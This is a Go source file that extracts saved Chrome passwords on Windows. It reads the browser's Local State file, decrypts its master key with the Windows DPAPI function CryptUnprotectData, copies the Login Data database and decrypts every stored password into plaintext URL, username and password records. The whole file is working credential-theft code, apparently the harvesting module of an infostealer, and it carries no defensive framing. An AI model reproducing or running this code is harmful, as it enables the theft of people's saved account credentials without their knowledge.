package windows

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"io/ioutil"
	"main/utils"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
)

const cryptprotectUiForbidden = 0x1

var (
	dllcrypt32      = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32     = syscall.NewLazyDLL("Kernel32.dll")
	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")
)

func makeBlob(d []byte) *DataBlob {
	if len(d) == 0 {
		return &DataBlob{}
	}
	return &DataBlob{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DataBlob) toByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func decryptKey(data []byte) ([]byte, error) {
	var outBlob DataBlob
	blob := makeBlob(data)
	r, _, err := procDecryptData.Call(
		uintptr(unsafe.Pointer(blob)), 0, 0, 0, 0, cryptprotectUiForbidden, uintptr(unsafe.Pointer(&outBlob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))
	return outBlob.toByteArray(), nil
}

func getKey(localStatePath string) ([]byte, error) {
	var localState LocalState
	stateBytes, err := ioutil.ReadFile(localStatePath)
	if err != nil {
		return nil, err
	}
	err = json.Unmarshal(stateBytes, &localState)
	if err != nil {
		return nil, err
	}
	key, err := base64.StdEncoding.DecodeString(localState.OSCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}
	decKey, err := decryptKey(key[5:])
	if err != nil {
		return nil, err
	}
	return decKey, nil
}

func decryptValue(encValue, key []byte) (string, error) {
	nonce := encValue[3 : 3+12]
	encValueWithTag := encValue[3+12:]
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", nil
	}
	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", nil
	}
	decValue, err := aesgcm.Open(nil, nonce, encValueWithTag, nil)
	if err != nil {
		return "", nil
	}
	return string(decValue), nil
}

func getLoginData(loginDataPath string, key []byte) (*[]utils.LoginData, error) {
	var (
		allLoginData []utils.LoginData
		url          string
		username     string
		encValue     []byte
	)
	db, err := sql.Open("sqlite3", loginDataPath)
	if err != nil {
		return nil, err
	}
	defer db.Close()
	query := "SELECT signon_realm, username_value, password_value FROM logins"
	rows, err := db.Query(query)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	for rows.Next() {
		rows.Scan(&url, &username, &encValue)
		if username == "" {
			continue
		}
		decValue, err := decryptValue(encValue, key)
		if err != nil {
			return nil, err
		}
		if decValue == "" {
			continue
		}
		d := utils.LoginData{
			URL:      url,
			Username: username,
			Password: decValue,
		}
		allLoginData = append(allLoginData, d)
	}
	return &allLoginData, nil
}

func Run() (*[]utils.LoginData, error) {
	var (
		userDataPath   = filepath.Join(os.Getenv("localappdata"), "Google", "Chrome", "User Data")
		localStatePath = filepath.Join(userDataPath, "Local State")
		loginDataPath  = filepath.Join(userDataPath, "Default", "Login Data")
	)
	loginDataPath, err := utils.MakeBackup(loginDataPath)
	if err != nil {
		return nil, err
	}
	defer os.Remove(loginDataPath)
	key, err := getKey(localStatePath)
	if err != nil {
		return nil, err
	}
	loginData, err := getLoginData(loginDataPath, key)
	if err != nil {
		return nil, err
	}
	return loginData, nil
}
